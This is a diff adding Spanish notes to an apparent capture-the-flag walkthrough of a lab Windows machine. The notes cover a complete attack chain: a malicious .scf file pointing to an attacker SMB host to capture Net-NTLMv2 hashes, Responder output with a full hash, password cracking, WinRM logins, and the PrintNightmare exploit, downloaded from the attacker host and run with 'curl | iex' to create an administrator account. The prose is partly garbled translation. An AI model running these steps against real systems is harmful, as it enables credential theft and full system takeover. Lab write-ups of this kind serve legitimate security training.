@@ -53,5 +53,65 @@ curl -s -I  -X GET 10.10.11.106 > web
  /admin.php
  /fw_up.php > upload frimware 
  
- dll
- 
+La página dice que lo que subo irá a su recurso compartido de archivos. Eso implica que no va necesariamente al servidor web, por lo que buscar una forma de cargar webshell no tiene mucho sentido.
+Un ataque clásico cuando tiene acceso de escritura a un recurso compartido de archivos es soltar un .scfarchivo que hace referencia a un archivo de icono en un recurso compartido SMB en un host controlado por un atacante.
+Si la carpeta que contiene el .scfarchivo se abre con el Explorador de archivos, el Explorador .scfse inspirará para volver a conectarse para obtener ese archivo de icono y ofrecerá negociación de autenticación Net-NTLMv2.
+Si controlo ese host, puedo capturar ese intercambio e intentar descifrar Net-NTLMv2.
+
+Los archivos SCF son archivos de comando de shell de Windows.
+
+[+]SMB-RELAY
+vim smb-relay.scf
+───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: smb-relay.scf
+───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ [Shell]
+   2   │ Command=2
+   3   │ IconFile=\\10.10.14.15\evil.exe
+
+
+[+]RESPONDER
+❯ sudo ./Responder.py -I tun0 -v
+
+[SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.106
+[SMB] NTLMv2-SSP Username : DRIVER\tony
+[SMB] NTLMv2-SSP Hash     : tony::DRIVER:8ce630cb3b663f7b:41FE0040B40832EDCF3F122B0AC38465:010100000000000080588A75C776D8015A272011DFA2F0DE000000000200080037004E005500530001001E00570049004E002D0035003600510054005600320032005900430041004A0004003400570049004E002D0035003600510054005600320032005900430041004A002E0037004E00550053002E004C004F00430041004C000300140037004E00550053002E004C004F00430041004C000500140037004E00550053002E004C004F00430041004C000700080080588A75C776D801060004000200000008003000300000000000000000000000002000005415B53437FD322004A813C83F9EB8D4585A891FFF8AD380A938EBE7ECB5A4110A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003500000000000000000000000000
+
+
+[+]JOHN
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt NTLMv2-SSP.Hash
+❯ liltony
+
+
+WinRM server               [ON]
+
+[+]CRACKMAPEXEC
+❯ python3 crackmapexec.py smb 10.10.11.106  -u tony -p liltony
+SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony
+
+❯ python3 crackmapexec.py winrm 10.10.11.106  -u tony -p liltony
+WINRM       10.10.11.106    5985   NONE             [+] None\tony:liltony (Pwn3d!)
+
+[+]USERFLAG[+]
+❯ evil-winrm -i 10.10.11.106 -u tony -p liltony
+*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
+8b91b77eab566d90d95014ebb4f14c61
+
+
+[+]PRINT NIGHTMARE[+]
+git clone https://github.com/calebstewart/CVE-2021-1675
+*Evil-WinRM* PS C:\Users\tony\Desktop> curl 10.10.14.15/CVE-2021-1675.ps1 -UseBasicParsing | iex
+*Evil-WinRM* PS C:\Users\tony\Desktop> Get-Command Invoke-Nightmare
+*Evil-WinRM* PS C:\Users\tony\Desktop> Invoke-Nightmare -NewUser "admin" -NewPassword "admin"
+
+[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
+[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
+[+] added user admin as local administrator
+[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
+
+
+[+]ROOT[+]
+❯ evil-winrm -i 10.10.11.106 -u admin -p admin
+
+*Evil-WinRM* PS C:\Users\administrator\desktop> type root.txt
+abaa97111f6e2a3f250832dee1e6710a
